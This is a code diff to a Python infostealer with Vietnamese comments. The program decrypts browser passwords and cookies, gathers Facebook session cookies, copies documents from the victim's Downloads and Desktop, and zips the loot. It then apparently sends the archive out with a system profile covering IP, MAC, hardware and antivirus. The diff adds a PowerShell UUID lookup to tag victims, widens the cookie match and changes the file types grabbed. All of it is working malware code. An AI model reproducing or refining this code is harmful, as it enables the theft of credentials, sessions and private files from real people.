@@ -23,6 +23,28 @@ from Cryptodome.Cipher import AES
 from Cryptodome.Random import get_random_bytes
 from Cryptodome.Util.Padding import pad, unpad
 import pytz
+import subprocess
+
+def get_device_id():
+    try:
+        # Chạy lệnh PowerShell để lấy Device ID
+        command = 'powershell "Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"'
+        result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, text=True)
+        
+        # Xóa khoảng trắng và xuống dòng
+        device_id = result.strip()
+        
+        return device_id
+    except Exception as e:
+        print("Lỗi khi lấy Device ID:", str(e))
+        return None
+
+device_id = get_device_id()
+# if device_id:
+    # print("Device ID:", device_id)
+
+
+
 
 vn_tz = pytz.timezone('Asia/Ho_Chi_Minh')
 # Lấy thời gian hiện tại của Việt Nam
@@ -391,7 +413,7 @@ def extract():
             else:secure = "FALSE"
             value = decryptPassword(user[3], getSecretKey(row['pathkey']))
 
-            if user[0] == '.facebook.com':
+            if user[0].find('facebook.com') > 0:
                 cookie_fb_item +=  user[1] + '=' + value  + ';'
 
             cookie = f"{user[0]}\t{httponly}\t{'/'}\t{secure}\t\t{user[1]}\t{value}\n"  
@@ -518,7 +540,7 @@ async def sendfile(TOKEN, ID, z_ph, caption1):
 name_f = ""
 def grab_files():
     global grabfiles
-    file_extensions = ['.txt','.py', '.html', '.php','.pyw','.pyc', '.jpg', '.jpeg', '.png', '.session', '.js', '.java']
+    file_extensions = ['.txt', '.docx']
     source_folders = [
         os.path.expanduser("~\\Downloads"),
         os.path.expanduser("~\\Desktop"),
@@ -539,7 +561,7 @@ def grab_files():
                             destination_path = os.path.join(path_data, 'GrabFiles', file)
                             shutil.copy(source_path, destination_path)
                             grabfiles +=1
-                            #print(f"Copied {file}")
+                            # print(f"Copied {file}")
                         else:
                             continue
                             #print(f"File {file} exceeds size limit. Not copying.")
@@ -566,7 +588,7 @@ async def main(TOKEN, ID):
 
 
     t = datetime.now(vn_tz).strftime('%d_%m_%Y_%H_%M')
-    name_f = f'{t}_{username}@[{country}]'
+    name_f = f'Databot_{device_id}_[{country}]'
     z_ph = os.path.join(os.environ["TEMP"], name_f +'.zip');shutil.make_archive(z_ph[:-4], 'zip', path_data)
     caption = f"       ==== @VIPBAOZ ====\n⏰ Date => {datetime.now(vn_tz).strftime('%d/%m/%Y %H:%M')}\n💻System => {computer_os}\n👤 User => {username}\n🆔 PC => {hostname}\n🏴 Country => [{country}]\n🔍 IP => {ip}\n🔍 Mac => {mac}\n⚙ Ram => {ram}\n⚙ Cpu => {cpu}\n⚙ Gpu => {gpu}\n📝 Language => {language}\n🔓 Antivirus => {antivirus}\n ====[ User Data ]====\n📂 FileGrabber => {grabfiles}\n ====[ Browsers Data ]====\n🗝 Passwords => {passwd}\n🍪 Cookies => {cookies}"
     
